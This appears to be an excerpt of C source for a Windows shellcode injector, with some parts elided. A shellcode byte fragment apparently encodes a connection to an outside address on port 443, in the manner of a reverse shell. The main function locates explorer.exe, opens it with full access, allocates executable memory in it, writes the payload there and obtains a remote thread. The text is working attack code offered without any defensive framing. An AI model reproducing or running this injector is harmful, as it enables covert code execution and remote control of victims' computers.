...
"\x89\xe5\x49\xbc\x02\x00\x01\xbb\x0a\x38\xff\xd8\x41\x54"
...
int main() {
    const char* targetProc = "explorer.exe"; // Change to desired target process

    PID = FindTargetProcess(targetProc);
    if (PID == 0) {
        warn("Target process '%s' not found.", targetProc);
        return EXIT_FAILURE;
    }
    info("Found target process '%s' with PID %ld", targetProc, PID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess == NULL) {
        warn("Can't open handle to process. PID: %ld error: %ld", PID, GetLastError());
        return EXIT_FAILURE;
    }
    okay("Got a handle to the process! 0x%p", hProcess);

    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(mawldeg), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!rBuffer) {
        warn("VirtualAllocEx failed. error: %ld", GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    okay("Allocated %zu bytes with PAGE_EXECUTE_READWRITE permission", sizeof(mawldeg));

    if (!WriteProcessMemory(hProcess, rBuffer, mawldeg, sizeof(mawldeg), NULL)) {
        warn("WriteProcessMemory failed. error: %ld", GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    okay("Wrote %zu bytes to process memory", sizeof(mawldeg));
    ...
    okay("Got a handle to the thread (%ld) 0x%p", TID, hThread);
